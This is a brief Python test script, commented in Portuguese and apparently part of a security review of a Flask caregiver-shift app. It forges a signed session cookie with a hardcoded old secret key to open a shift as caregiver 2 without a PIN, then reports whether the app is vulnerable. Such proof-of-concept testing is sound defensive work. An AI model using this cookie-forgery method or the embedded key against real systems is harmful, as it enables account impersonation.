# Prova da A01: forja um cookie com a chave antiga e tenta abrir um turno em nome do cuidador 2 sem PIN
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
from app import app

falso = Flask("atacante")
falso.secret_key = "geratrix-mvp-v0"
cookie = SecureCookieSessionInterface().get_signing_serializer(falso).dumps({"cuidador_id": 2})

cliente = app.test_client()
cliente.set_cookie("session", cookie)
r = cliente.get("/turno/abrir")
print("VULNERÁVEL: entrou sem PIN (HTTP 200)" if r.status_code == 200 else f"PROTEGIDO: recusado (HTTP {r.status_code} -> {r.headers.get('Location')})")